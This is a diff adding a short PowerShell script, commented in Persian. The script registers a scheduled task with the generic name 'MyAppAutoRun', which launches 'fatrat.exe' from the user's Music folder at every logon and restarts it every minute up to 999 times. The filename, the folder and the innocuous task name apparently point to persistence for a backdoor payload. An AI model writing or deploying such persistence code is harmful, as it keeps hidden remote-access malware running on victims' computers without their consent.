@@ -1,0 +1,14 @@
+# مسیر فایل
+$exePath = Join-Path $env:USERPROFILE "Music\fatrat.exe"
+
+# اکشن
+$action = New-ScheduledTaskAction -Execute $exePath
+
+# اجرا در هر Logon
+$trigger = New-ScheduledTaskTrigger -AtLogOn
+
+# نسخه سازگار با همه ویندوزها (Restart هر 1 دقیقه در صورت بسته شدن)
+$settings = New-ScheduledTaskSettingsSet -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)
+
+# ثبت Task
+Register-ScheduledTask -TaskName "MyAppAutoRun" -Action $action -Trigger $trigger -Settings $settings -Force
